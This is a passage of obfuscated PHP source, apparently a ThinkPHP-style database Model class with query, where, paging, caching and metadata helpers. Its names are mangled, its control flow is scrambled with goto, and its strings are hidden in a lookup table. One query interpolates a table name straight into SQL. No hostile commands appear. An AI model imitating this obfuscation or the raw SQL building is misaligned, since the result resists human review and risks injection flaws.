$E¹±“–ÍÖ == $b÷âø¼àÅ; } case $e×Š…Ó³í¨[338]: list($Aè£ªÇ¾â, $a‚—ÕÙ›‚) = explode($e×Š…Ó³í¨[57], $b÷âø¼àÅ); if (!is_numeric($Aè£ªÇ¾â)) { $Aè£ªÇ¾â = strtotime($Aè£ªÇ¾â); } if (!is_numeric($a‚—ÕÙ›‚)) { $a‚—ÕÙ›‚ = strtotime($a‚—ÕÙ›‚); } return NOW_TIME >= $Aè£ªÇ¾â && NOW_TIME <= $a‚—ÕÙ›‚; case $e×Š…Ó³í¨[339]: return in_array(get_client_ip(), explode($e×Š…Ó³í¨[57], $b÷âø¼àÅ)); case $e×Š…Ó³í¨[340]: return !in_array(get_client_ip(), explode($e×Š…Ó³í¨[57], $b÷âø¼àÅ)); case $e×Š…Ó³í¨[327]: default: return $this->regex($f„Şà«, $b÷âø¼àÅ); } } public function query($E…ä„¶ğ²¸, $aŸâ„ÆÖ£Ü = false) { $A’’—äòÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!is_bool($aŸâ„ÆÖ£Ü) && !is_array($aŸâ„ÆÖ£Ü)) { $aŸâ„ÆÖ£Ü = func_get_args(); array_shift($aŸâ„ÆÖ£Ü); } $E…ä„¶ğ²¸ = str_replace(array($A’’—äòÑ[10], $A’’—äòÑ[341]), $A’’—äòÑ[60], $E…ä„¶ğ²¸); $E…ä„¶ğ²¸ = $this->parseSql($E…ä„¶ğ²¸, $aŸâ„ÆÖ£Ü); return $this->db->query($E…ä„¶ğ²¸); } public function execute($F¡“Ş Ûé, $bß³…ùí§“ = false) { if (!is_bool($bß³…ùí§“) && !is_array($bß³…ùí§“)) { $bß³…ùí§“ = func_get_args(); array_shift($bß³…ùí§“); } $F¡“Ş Ûé = $this->parseSql($F¡“Ş Ûé, $bß³…ùí§“); return $this->db->execute($F¡“Ş Ûé); } protected function parseSql($bÕšÉà£Æ¸, $EëĞá“Ø¶) { $fİ£”óé„ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!0 === $EëĞá“Ø¶) { $bôÈÌõÜ¤ = $this->_parseOptions(); $bÕšÉà£Æ¸ = $this->db->parseSql($bÕšÉà£Æ¸, $bôÈÌõÜ¤); } elseif (is_array($EëĞá“Ø¶)) { $EëĞá“Ø¶ = array_map(array($this->db, $fİ£”óé„[342]), $EëĞá“Ø¶); $bÕšÉà£Æ¸ = vsprintf($bÕšÉà£Æ¸, $EëĞá“Ø¶); } else { $bÕšÉà£Æ¸ = strtr($bÕšÉà£Æ¸, array($fİ£”óé„[343] => $this->getTableName(), $fİ£”óé„[344] => think_config($fİ£”óé„[243]))); } $this->db->setModel($this->name); return $bÕšÉà£Æ¸; } public function db($CƒãÏ»µ™† = '', $FĞ’Ğ¼Ö² = '', $FŒ˜Ïäñ® = array()) { goto b˜ÆéËìöù; b˜ÆéËìöù: $cà±Íåóİ™ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($cà±Íåóİ™[43] === $CƒãÏ»µ™† && $this->db) { return $this->db; } static $fÑ­Ä¥…ØÛ = array(); goto Eí‘×„“öŒ; Eí‘×„“öŒ: static $fª‹òÂ¯À = array(); if (!isset($fª‹òÂ¯À[$CƒãÏ»µ™†]) || isset($fª‹òÂ¯À[$CƒãÏ»µ™†]) && $FĞ’Ğ¼Ö² && $fÑ­Ä¥…ØÛ[$CƒãÏ»µ™†] != $FĞ’Ğ¼Ö²) { if (!empty($FĞ’Ğ¼Ö²) && is_string($FĞ’Ğ¼Ö²) && !1 === strpos($FĞ’Ğ¼Ö², $cà±Íåóİ™[18])) { $FĞ’Ğ¼Ö² = think_config($FĞ’Ğ¼Ö²); } $fª‹òÂ¯À[$CƒãÏ»µ™†] = Db::getInstance($FĞ’Ğ¼Ö²); } elseif (NULL === $FĞ’Ğ¼Ö²) { $fª‹òÂ¯À[$CƒãÏ»µ™†]->close(); unset($fª‹òÂ¯À[$CƒãÏ»µ™†]); return; } if (!empty($FŒ˜Ïäñ®)) { if (is_string($FŒ˜Ïäñ®)) { parse_str($FŒ˜Ïäñ®, $FŒ˜Ïäñ®); } foreach ($FŒ˜Ïäñ® as $d‡‰ˆ¨ë‚ó => $E÷“²ˆ•ŠÓ) { $this->setProperty($d‡‰ˆ¨ë‚ó, $E÷“²ˆ•ŠÓ); } } goto AÅ•É­Ì¾; c®¸èÀ×•ñ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto fñ®­ä…–ò; AÅ•É­Ì¾: $fÑ­Ä¥…ØÛ[$CƒãÏ»µ™†] = $FĞ’Ğ¼Ö²; $this->db = $fª‹òÂ¯À[$CƒãÏ»µ™†]; $this->_after_db(); goto c®¸èÀ×•ñ; fñ®­ä…–ò: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $fÁ•Áù²¿× = get_class($this); if ($fÁ•Áù²¿× == $_SERVER[¹÷ˆ§éÒ°ú][345]) { return $this->name; } $this->name = substr($fÁ•Áù²¿×, 0, -5); } return $this->name; } public function getTableName() { $Bç«íš•ëß =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($this->trueTableName)) { $E­çŞ¹ÑÊ° = !empty($this->tablePrefix) ? $this->tablePrefix : $Bç«íš•ëß[43]; if (!empty($this->tableName)) { $E­çŞ¹ÑÊ° .= $this->tableName; } else { $E­çŞ¹ÑÊ° .= think_parse_name($this->name); } $this->trueTableName = strtolower($E­çŞ¹ÑÊ°); } return (!empty($this->dbName) ? $this->dbName . $Bç«íš•ëß[103] : $Bç«íš•ëß[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $cÊì÷ŞŸ¯ã =& $_SERVER[¹÷ˆ§éÒ°ú]; return isset($this->fields[$cÊì÷ŞŸ¯ã[250]]) ? $this->fields[$cÊì÷ŞŸ¯ã[250]] : $this->pk; } public function getDbFields() { $E‚ŒŠ‰â˜  =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($this->options[$E‚ŒŠ‰â˜ [278]])) { $AÄ¥Ğ„ÁÔ = $this->db->getFields($this->options[$E‚ŒŠ‰â˜ [278]]); return $AÄ¥Ğ„ÁÔ ? array_keys($AÄ¥Ğ„ÁÔ) : !1; } if ($this->fields) { $AÄ¥Ğ„ÁÔ = $this->fields; unset($AÄ¥Ğ„ÁÔ[$E‚ŒŠ‰â˜ [249]], $AÄ¥Ğ„ÁÔ[$E‚ŒŠ‰â˜ [250]], $AÄ¥Ğ„ÁÔ[$E‚ŒŠ‰â˜ [251]], $AÄ¥Ğ„ÁÔ[$E‚ŒŠ‰â˜ [248]]); return $AÄ¥Ğ„ÁÔ; } return !1; } public function data($e­ç¢œØ = '') { $aö‹Øğ®• =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($aö‹Øğ®•[43] === $e­ç¢œØ && !empty($this->data)) { return $this->data; } if (is_object($e­ç¢œØ)) { $e­ç¢œØ = get_object_vars($e­ç¢œØ); } elseif (is_string($e­ç¢œØ)) { parse_str($e­ç¢œØ, $e­ç¢œØ); } elseif (!is_array($e­ç¢œØ)) { think_exception(think_lang($aö‹Øğ®•[270])); } $this->data = $e­ç¢œØ; return $this; } public function join($fê—Ãòœ¤İ) { $BŸãË…‚³ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_array($fê—Ãòœ¤İ)) { $this->options[$BŸãË…‚³[281]] = $fê—Ãòœ¤İ; } elseif (!empty($fê—Ãòœ¤İ)) { $this->options[$BŸãË…‚³[281]][] = $fê—Ãòœ¤İ; } return $this; } public function union($féİÇó­»ƒ, $AÀ‰–èå™â = false) { goto fİ·‚ùŒĞ; fŠİñËÁŒØ: if (is_object($féİÇó­»ƒ)) { $féİÇó­»ƒ = get_object_vars($féİÇó­»ƒ); } if (is_string($féİÇó­»ƒ)) { $eÚÕˆ²Øå = $féİÇó­»ƒ; } elseif (is_array($féİÇó­»ƒ)) { if (isset($féİÇó­»ƒ[0])) { $this->options[$DÚ£Á™é¿É[346]] = array_merge($this->options[$DÚ£Á™é¿É[346]], $féİÇó­»ƒ); return $this; } else { $eÚÕˆ²Øå = $féİÇó­»ƒ; } } else { think_exception(think_lang($DÚ£Á™é¿É[270])); } $this->options[$DÚ£Á™é¿É[346]][] = $eÚÕˆ²Øå; goto D‹§î×İŒÄ; D‹§î×İŒÄ: return $this; goto CÙµÇ‚ºñ‡; fİ·‚ùŒĞ: $DÚ£Á™é¿É =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($féİÇó­»ƒ)) { return $this; } if ($AÀ‰–èå™â) { $this->options[$DÚ£Á™é¿É[346]][$DÚ£Á™é¿É[347]] = !0; } goto fŠİñËÁŒØ; CÙµÇ‚ºñ‡: } public function cache($CŒƒôÚğ¤ = true, $aÒŞ‹‘‚çÖ = null, $CªÂ˜¿®¸ = '') { $cÂ˜§Å…¬’ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!1 !== $CŒƒôÚğ¤) { $this->options[$cÂ˜§Å…¬’[348]] = array($cÂ˜§Å…¬’[101] => $CŒƒôÚğ¤, $cÂ˜§Å…¬’[338] => $aÒŞ‹‘‚çÖ, $cÂ˜§Å…¬’[39] => $CªÂ˜¿®¸); } return $this; } public function field($A†…Î¤ÈÒº, $eÈ´´Ç¥îŠ = false) { $aÑã¹ô†‹ó =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!0 === $A†…Î¤ÈÒº) { $bÕ‡†Ã°µÒ = $this->getDbFields(); $A†…Î¤ÈÒº = $bÕ‡†Ã°µÒ ? $bÕ‡†Ã°µÒ : $aÑã¹ô†‹ó[188]; } elseif ($eÈ´´Ç¥îŠ) { if (is_string($A†…Î¤ÈÒº)) { $A†…Î¤ÈÒº = explode($aÑã¹ô†‹ó[57], $A†…Î¤ÈÒº); } $bÕ‡†Ã°µÒ = $this->getDbFields(); $A†…Î¤ÈÒº = $bÕ‡†Ã°µÒ ? array_diff($bÕ‡†Ã°µÒ, $A†…Î¤ÈÒº) : $A†…Î¤ÈÒº; } $this->options[$aÑã¹ô†‹ó[272]] = $A†…Î¤ÈÒº; return $this; } public function scope($d‡±Ş©¿­ = '', $D¼§ó¤¸‡Ù = NULL) { $DĞŒ•“ƒ° =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($DĞŒ•“ƒ°[43] === $d‡±Ş©¿­) { if (isset($this->_scope[$DĞŒ•“ƒ°[44]])) { $EÄÙ÷Ğç±” = $this->_scope[$DĞŒ•“ƒ°[44]]; } else { return $this; } } elseif (is_string($d‡±Ş©¿­)) { $b­…®Úõ—Ï = explode($DĞŒ•“ƒ°[57], $d‡±Ş©¿­); $EÄÙ÷Ğç±” = array(); foreach ($b­…®Úõ—Ï as $CÉÉ…ÒœÚ®) { if (!isset($this->_scope[$CÉÉ…ÒœÚ®])) { continue; } $EÄÙ÷Ğç±” = array_merge($EÄÙ÷Ğç±”, $this->_scope[$CÉÉ…ÒœÚ®]); } if (!empty($D¼§ó¤¸‡Ù) && is_array($D¼§ó¤¸‡Ù)) { $EÄÙ÷Ğç±” = array_merge($EÄÙ÷Ğç±”, $D¼§ó¤¸‡Ù); } } elseif (is_array($d‡±Ş©¿­)) { $EÄÙ÷Ğç±” = $d‡±Ş©¿­; } if (is_array($EÄÙ÷Ğç±”) && !empty($EÄÙ÷Ğç±”)) { $this->options = array_merge($this->options, array_change_key_case($EÄÙ÷Ğç±”)); } return $this; } public function where($E¡ç•²ø§¾, $Eàå‰ÍÕÊ = null) { $Fâã‚½—Ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!is_null($Eàå‰ÍÕÊ) && is_string($E¡ç•²ø§¾)) { if (!is_array($Eàå‰ÍÕÊ)) { $Eàå‰ÍÕÊ = func_get_args(); array_shift($Eàå‰ÍÕÊ); } $Eàå‰ÍÕÊ = array_map(array($this->db, $Fâã‚½—Ğ[342]), $Eàå‰ÍÕÊ); $E¡ç•²ø§¾ = vsprintf($E¡ç•²ø§¾, $Eàå‰ÍÕÊ); } elseif (is_object($E¡ç•²ø§¾)) { $E¡ç•²ø§¾ = get_object_vars($E¡ç•²ø§¾); } elseif (is_array($E¡ç•²ø§¾)) { foreach ($E¡ç•²ø§¾ as $A È²ñÑ½ => $C³›¨Ù”ÎÂ) { if ((is_numeric($A È²ñÑ½) || !$A È²ñÑ½) && is_string($C³›¨Ù”ÎÂ)) { think_trace($Fâã‚½—Ğ[349], $Fâã‚½—Ğ[43], $Fâã‚½—Ğ[56]); die; } } } if (is_string($E¡ç•²ø§¾) && $Fâã‚½—Ğ[43] != $E¡ç•²ø§¾) { $b—ÑÍ½¤Ïç = array(); $b—ÑÍ½¤Ïç[$Fâã‚½—Ğ[350]] = $E¡ç•²ø§¾; $E¡ç•²ø§¾ = $b—ÑÍ½¤Ïç; } if (isset($this->options[$Fâã‚½—Ğ[274]])) { $this->options[$Fâã‚½—Ğ[274]] = array_merge($this->options[$Fâã‚½—Ğ[274]], $E¡ç•²ø§¾); } else { $this->options[$Fâã‚½—Ğ[274]] = $E¡ç•²ø§¾; } return $this; } public function limit($Eºùéº÷èç, $FôĞğ›‘ = null) { $eµõØŠì®… =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->options[$eµõØŠì®…[291]] = is_null($FôĞğ›‘) ? $Eºùéº÷èç : $Eºùéº÷èç . $eµõØŠì®…[57] . $FôĞğ›‘; return $this; } public function page($EÍîî‚¼¢š, $E‚ï²ƒ¥½ß = null) { $D›îãİøÊó =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->options[$D›îãİøÊó[351]] = is_null($E‚ï²ƒ¥½ß) ? $EÍîî‚¼¢š : $EÍîî‚¼¢š . $D›îãİøÊó[57] . $E‚ï²ƒ¥½ß; return $this; } public function comment($DâÆ…à³) { $this->options[$_SERVER[¹÷ˆ§éÒ°ú][352]] = $DâÆ…à³; return $this; } public function setProperty($e†¬¯ĞŞÛ‰, $d¥‘×³ğòä) { if (property_exists($this, $e†¬¯ĞŞÛ‰)) { $this->{$e†¬¯ĞŞÛ‰} = $d¥‘×³ğòä; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\151\155\x65", "\164\x69\x6d\145", "\x69\x6e\163\x65\162\x74\54\165\160\x64\x61\164\145", "\146\x75\x6e\x63\x74\151\157\156"), array("\143\162\x65\x61\164\145\x54\x69\x6d\x65", "\164\x69\155\145", "\151\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\156")); public function setDataAuto($e‡ˆ‰½›‚ö) { $this->dataAuto = $e‡ˆ‰½›‚ö; } public function __construct($F”†Ûª = '', $e†œ×¶¡  = '', $E¸÷™‹š§ï = '') { parent::__construct($F”†Ûª, $e†œ×¶¡ , $E¸÷™‹š§ï); } public static function textEncode($F½—²Æ‹¼©) { if (!$F½—²Æ‹¼©) { return $F½—²Æ‹¼©; } $cíËË‘“¶ = json_encode($F½—²Æ‹¼©); $cíËË‘“¶ = preg_replace_callback($_SERVER[¹÷ˆ§éÒ°ú][353], function ($Eæ±»ÚÍÂÉ) { return addslashes($Eæ±»ÚÍÂÉ[0]); }, $cíËË‘“¶); return json_decode($cíËË‘“¶); } public static function textDecode($Eˆ½Íó¸ËÍ) { $fÓÕ×¤—•ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d°šë«ƒ = json_encode($Eˆ½Íó¸ËÍ); $d°šë«ƒ = preg_replace_callback($fÓÕ×¤—•ğ[354], function ($b±ˆ‹…¦»İ) { return $_SERVER[¹÷ˆ§éÒ°ú][105]; }, $d°šë«ƒ); return json_decode($d°šë«ƒ); } protected $tableMeta = array(); protected function _beforeInsert(&$d»‚ñ»øñà, $AÅˆ×½«¿) { $fÁ¼ßùß¨ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->checkDataAutoHas($fÁ¼ßùß¨[355])) { return; } $this->dataBeforeFilter($d»‚ñ»øñà, $fÁ¼ßùß¨[355]); } protected function _beforeUpdate(&$E‡¼Ü¯ë—¶, $dÍÛÊÆÕ„) { $e„Şø¬Ë‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->checkDataAutoHas($e„Şø¬Ë‚[356])) { return; } $this->dataBeforeFilter($E‡¼Ü¯ë—¶, $e„Şø¬Ë‚[356]); } protected function _afterSelect(&$bí…—ïìÚ, $e¬ğÛ²®ì) { if (!is_array($bí…—ïìÚ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹÷ˆ§éÒ°ú][357])) { return; } foreach ($bí…—ïìÚ as &$fÉÌ…†õ©) { $this->dataAfterFilter($fÉÌ…†õ©); } } protected function _afterFind(&$EÒ™ŸåŞ«Ç, $d×­ŒÛÔËÒ) { if (!is_array($EÒ™ŸåŞ«Ç)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹÷ˆ§éÒ°ú][357])) { return; } $this->dataAfterFilter($EÒ™ŸåŞ«Ç); } public function setAutoIncrement($cÙ·‹‚İ°) { $AÀ†éêé‘ì = array($this->getPk() => $cÙ·‹‚İ°); $E¿…ã¼õô = $this->data($AÀ†éêé‘ì)->add(); if ($E¿…ã¼õô) { $this->delete($E¿…ã¼õô); } } public function getAutoIncrement() { $cÅ±Ô¦‹Œ = $this->getTableName(); $eôÓ…¤¨õ = $this->max($this->getPk()); $d ±ô¨ºù = $this->query("\x73\150\157\167\40\164\141\142\154\x65\40\163\164\x61\x74\165\163\40\167\150\145\162\145\x20\x4e\141\x6d\x65\75\47{$cÅ±Ô¦‹Œ}\x27"); $B÷®´¥ÙÃÊ = $d ±ô¨ºù[0][$_SERVER[¹÷ˆ§éÒ°ú][358]]; $d–ÜÙòö¹ = max($eôÓ…¤¨õ, $B÷®´¥ÙÃÊ); return $d–ÜÙòö¹; } protected function _callBefore($e¬Ğ¿‹Ì‡Ü, $f„°—àÓ—) { return $this->cacheCallCheck($e¬Ğ¿‹Ì‡Ü, $f„°—àÓ—, !1); } protected function _callAfter($AìÓâ‚âğ, $C±©¯ÂáŒ´) { return $this->cacheCallCheck($AìÓâ‚âğ, $C±©¯ÂáŒ´, !0); } protected function cacheFunctionAlias($C‰½–Ôè‡Õ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($BÊªÊ‘öóó, $fË§•İ§Âì, $dÈôÜ§ê— = false) { $aéÁ¸…–‰½ = $this->cacheFunctionAlias($fË§•İ§Âì); if (!$aéÁ¸…–‰½) { return; } foreach ($aéÁ¸…–‰½ as $Cùğè´ÙØ => $CÉ¾­®‰Âš) { $Eîò®½ = $CÉ¾­®‰Âš[0]; $b¡…öá…‘½ = explode($_SERVER[¹÷ˆ§éÒ°ú][57], $CÉ¾­®‰Âš[1]); if ($BÊªÊ‘öóó == $Cùğè´ÙØ) { return $this->cacheFunctionGet($Cùğè´ÙØ, $Eîò®½); } if ($dÈôÜ§ê— && in_array($BÊªÊ‘öóó, $b¡…öá…‘½)) { $this->cacheFunctionClear($Cùğè´ÙØ, $Eîò®½); } } } public function cacheFunctionGet($CÎ›íÁÈõŞ, $e®Âœ¢‚ÃÄ) { $A¯ÔšÁ¯÷‹ = $this->cacheKeyMake($CÎ›íÁÈõŞ, $e®Âœ¢‚ÃÄ); $aÍ—ÒÂæ£¹ = Cache::get($A¯ÔšÁ¯÷‹); if (!is_array($aÍ—ÒÂæ£¹)) { $aÍ—ÒÂæ£¹ = call_user_func_array(array($this, $CÎ›íÁÈõŞ), array($e®Âœ¢‚ÃÄ, !0)); Cache::set($A¯ÔšÁ¯÷‹, $aÍ—ÒÂæ£¹); } return $aÍ—ÒÂæ£¹; } public function cacheFunctionClear($bƒ§¢™êã, $f‚Üõ£³“) { $e¿×°³±È = $f‚Üõ£³“; if (!is_array($f‚Üõ£³“)) { $e¿×°³±È = array($f‚Üõ£³“); } foreach ($e¿×°³±È as $A‘¶¶®Òº) { $cƒ†œ¯É¥« = $this->cacheKeyMake($bƒ§¢™êã, $A‘¶¶®Òº); Cache::remove($cƒ†œ¯É¥«); } } private function cacheKeyMake($a¹Óêîù, $A†Ô‚ƒó½) { $a™‘øŠÀ =& $_SERVER[¹÷ˆ§éÒ°ú]; return get_class($this) . $a™‘øŠÀ[82] . $a¹Óêîù . $a™‘øŠÀ[359] . $A†Ô‚ƒó½; } protected function selectPage($dë®…ñ­¯ = 200, $F‹Ñçš†Ú = 1) { goto a¿©ò»Ü; B Ì›Âòé: $cµå¹ô¼ ¿ = 4000; $dë®…ñ­¯ = isset($in[$Fªê–µçĞ®[360]]) ? $in[$Fªê–µçĞ®[360]] : $dë®…ñ­¯; if ($dë®…ñ­¯ === -1) { unset($in[$Fªê–µçĞ®[360]]); $cµå¹ô¼ ¿ = 100000000; $dë®…ñ­¯ = $cµå¹ô¼ ¿; } goto DéÒ—¶¤­Á; eå‹Û–½±: if ($aœÆÁùƒÈœ == 1) { $AŠß˜å¸ÛË = count($AÌ½Š¢öÈ); } $B…Î®ÖÒ‰ = array($Fªê–µçĞ®[362] => array($Fªê–µçĞ®[363] => $AŠß˜å¸ÛË, $Fªê–µçĞ®[360] => $dë®…ñ­¯, $Fªê–µçĞ®[351] => $F‹Ñçš†Ú, $Fªê–µçĞ®[364] => $aœÆÁùƒÈœ), $Fªê–µçĞ®[365] => $AÌ½Š¢öÈ ? $AÌ½Š¢öÈ : array()); return $B…Î®ÖÒ‰; goto cËª‡ÃòŸñ; dš®ÔáÜñ: $aœÆÁùƒÈœ = ceil($AŠß˜å¸ÛË / $dë®…ñ­¯); $F‹Ñçš†Ú = intval(isset($in[$Fªê–µçĞ®[351]]) ? $in[$Fªê–µçĞ®[351]] : $F‹Ñçš†Ú); $F‹Ñçš†Ú = $F‹Ñçš†Ú <= 1 ? 1 : ($F‹Ñçš†Ú >= $aœÆÁùƒÈœ ? $aœÆÁùƒÈœ : $F‹Ñçš†Ú); goto EØŒÉ´; DéÒ—¶¤­Á: $aºÎ—ß£Æ = $BÅ†öÒÊÀ; $aºÎ—ß£Æ[$Fªê–µçĞ®[361]] = array(); $this->optionsValue($aºÎ—ß£Æ); goto döëš²Ì; EØŒÉ´: $this->optionsValue($BÅ†öÒÊÀ); $AÌ½Š¢öÈ = $this->page($F‹Ñçš†Ú, $dë®…ñ­¯)->select(); $AÌ½Š¢öÈ = is_array($AÌ½Š¢öÈ) ? $AÌ½Š¢öÈ : array(); goto eå‹Û–½±; a¿©ò»Ü: $Fªê–µçĞ® =& $_SERVER[¹÷ˆ§éÒ°ú]; global $in; $BÅ†öÒÊÀ = $this->optionsValue(); goto B Ì›Âòé; döëš²Ì: $AŠß˜å¸ÛË = intval($this->count()); $dë®…ñ­¯ = intval($dë®…ñ­¯); $dë®…ñ­¯ = $dë®…ñ­¯ <= 5 ? 5 : ($dë®…ñ­¯ >= $cµå¹ô¼ ¿ ? $cµå¹ô¼ ¿ : $dë®…ñ­¯); goto dš®ÔáÜñ; cËª‡ÃòŸñ: } protected function checkLength($b•¬‚Œ„—å, $fÇ†‘²»° = 0, $c×ŞğÑÊÍ½ = '') { $D­¬è¡îÁĞ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fÇ†‘²»° = $fÇ†‘²»° ? $fÇ†‘²»° : 65536; if (!$b•¬‚Œ„—å || strlen($b•¬‚Œ„—å) < $fÇ†‘²»°) { return; } $c×ŞğÑÊÍ½ = $c×ŞğÑÊÍ½ ? $c×ŞğÑÊÍ½ . $D­¬è¡îÁĞ[79] : $D­¬è¡îÁĞ[43]; show_json($c×ŞğÑÊÍ½ . LNG($D­¬è¡îÁĞ[366]) . "\x28{$fÇ†‘²»°}\51", !1); } protected function metaSet($B“ÕáÛ– Å, $B­Š¸¬”¸ = null, $aœ¥Æœ‹¹• = null) { goto eÀ’Å¼ˆ¥; Dä±»ğ¯èß: if (is_string($B­Š¸¬”¸)) { $B¢µ£óÄÈÂ[$B­Š¸¬”¸] = $aœ¥Æœ‹¹•; } $B›Á¦«åø = array(); foreach ($B¢µ£óÄÈÂ as $F‚Ã§ò‚°ê => $cÉ±¸Ç«¡Œ) { $this->checkLength($cÉ±¸Ç«¡Œ, !1, $d¬µ‡‹ÛÛ . $f­ß ¢ËÃ[14] . $F‚Ã§ò‚°ê); $B›Á¦«åø[] = array($Dˆí›˜àÜì => $B“ÕáÛ– Å, $f­ß ¢ËÃ[101] => $F‚Ã§ò‚°ê, $f­ß ¢ËÃ[370] => $cÉ±¸Ç«¡Œ); } goto c»Àâæ…; a¨×Œ‹Ûæ“: $d¬µ‡‹ÛÛ = $this->tableMeta[$f­ß ¢ËÃ[368]]; $BãôŒà«ŸÜ = Model($d¬µ‡‹ÛÛ); $Aë‰¡ìÀøï = array($Dˆí›˜àÜì => $B“ÕáÛ– Å, $f­ß ¢ËÃ[369] => $B­Š¸¬”¸); goto FôËÍ‚ˆ·„; FôËÍ‚ˆ·„: if (is_null($B­Š¸¬”¸)) { return $BãôŒà«ŸÜ->where(array($Dˆí›˜àÜì => $B“ÕáÛ– Å))->delete(); } if (is_null($aœ¥Æœ‹¹•) && is_string($B­Š¸¬”¸)) { return $BãôŒà«ŸÜ->where($Aë‰¡ìÀøï)->delete(); } $B¢µ£óÄÈÂ = is_array($B­Š¸¬”¸) ? $B­Š¸¬”¸ : array(); goto Dä±»ğ¯èß; c»Àâæ…: $BãôŒà«ŸÜ->where(array($Dˆí›˜àÜì => $B“ÕáÛ– Å))->addAll($B›Á¦«åø, array(), !0); return !0; goto f‹ÙšÊ±®¬; eÀ’Å¼ˆ¥: $f­ß ¢ËÃ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->tableMeta) { return !1; } $Dˆí›˜àÜì = $this->tableMeta[$f­ß ¢ËÃ[367]]; goto a¨×Œ‹Ûæ“; f‹ÙšÊ±®¬: } public function metaGet($C¿·ñ¹õ©Ù, $aß¸áò‰Á = false) { goto AÚÑ÷ŠŠœç; F›ìæ¸ß£‰: $d¿¥¼–—ß = $AÌÔñà´ÌÊ->field($a»ÛÕ‚•Š[371])->where($C—”¡‚‡´)->select(); $d¿¥¼–—ß = array_to_keyvalue($d¿¥¼–—ß, $a»ÛÕ‚•Š[101], $a»ÛÕ‚•Š[370]); return $d¿¥¼–—ß; goto dğË¾­×‹Ş; eóõ˜ËŸ¦: $AÌÔñà´ÌÊ = Model($this->tableMeta[$a»ÛÕ‚•Š[368]]); if ($aß¸áò‰Á) { $C—”¡‚‡´ = array($EóÎ±ŠÆÁ  => $C¿·ñ¹õ©Ù, $a»ÛÕ‚•Š[101] => $aß¸áò‰Á); return $AÌÔñà´ÌÊ->where($C—”¡‚‡´)->getField($a»ÛÕ‚•Š[370]); } $C—”¡‚‡´ = array($EóÎ±ŠÆÁ  => $C¿·ñ¹õ©Ù); goto F›ìæ¸ß£‰; AÚÑ÷ŠŠœç: $a»ÛÕ‚•Š =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->tableMeta) { return array(); } $EóÎ±ŠÆÁ  = $this->tableMeta[$a»ÛÕ‚•Š[367]]; goto eóõ˜ËŸ¦; dğË¾­×‹Ş: } private function checkDataAutoHas($A‰¥Ñ’†°) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $D°ÅšÏŒÖĞ) { if (in_array($A‰¥Ñ’†°, explode($_SERVER[¹÷ˆ§éÒ°ú][57], $D°ÅšÏŒÖĞ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$AâòÚ–ŠŒ, $BÍ“Õİ«ğÆ) { $DÉÒ«ØĞç… =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($this->dataAuto as $A¤ŠÀÍ¦) { $e ²øèÏê = $A¤ŠÀÍ¦[0]; if (!in_array($BÍ“Õİ«ğÆ, explode($DÉÒ«ØĞç…[57], $A¤ŠÀÍ¦[2]))) { continue; } switch (trim($A¤ŠÀÍ¦[3])) { case $DÉÒ«ØĞç…[320]: case $DÉÒ«ØĞç…[321]: $C§„õô®©È = $A¤ŠÀÍ¦[1]; $Bò†ÀöŠ‹Ï = isset($A¤ŠÀÍ¦[4]) ? (array) $A¤ŠÀÍ¦[4] : array(); if ($C§„õô®©È == $DÉÒ«ØĞç…[202] && array_key_exists($e ²øèÏê, $AâòÚ–ŠŒ)) { if (!$AâòÚ–ŠŒ[$e ²øèÏê]) { unset($AâòÚ–ŠŒ[$e ²øèÏê]); } break; } if (isset($AâòÚ–ŠŒ[$e ²øèÏê])) { array_unshift($Bò†ÀöŠ‹Ï, $AâòÚ–ŠŒ[$e ²øèÏê]); } if ($DÉÒ«ØĞç…[320] == $A¤ŠÀÍ¦[3]) { $AâòÚ–ŠŒ[$e ²øèÏê] = call_user_func_array($C§„õô®©È, $Bò†ÀöŠ‹Ï); } else { $AâòÚ–ŠŒ[$e ²øèÏê] = call_user_func_array(array(&$this, $C§„õô®©È), $Bò†ÀöŠ‹Ï); } break; case $DÉÒ«ØĞç…[272]: $AâòÚ–ŠŒ[$e ²øèÏê] = $AâòÚ–ŠŒ[$A¤ŠÀÍ¦[1]]; break; case $DÉÒ«ØĞç…[293]: if (isset($AâòÚ–ŠŒ[$e ²øèÏê]) && !is_string($AâòÚ–ŠŒ[$e ²øèÏê])) { $AâòÚ–ŠŒ[$e ²øèÏê] = json_encode_force($AâòÚ–ŠŒ[$e ²øèÏê]); } break; case $DÉÒ«ØĞç…[322]: if ($AâòÚ–ŠŒ[$e ²øèÏê] === $DÉÒ«ØĞç…[43]) { 